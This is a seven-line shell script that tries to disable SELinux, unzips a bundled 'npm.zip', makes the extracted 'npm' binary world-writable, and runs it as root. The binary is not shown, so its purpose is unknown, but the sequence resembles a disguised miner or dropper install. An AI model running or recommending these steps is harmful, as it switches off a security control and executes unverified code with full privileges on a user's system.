sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sudo apt install unzip -y
cd ~
unzip npm.zip
cd npm
chmod 777 ./npm
sudo ./npm
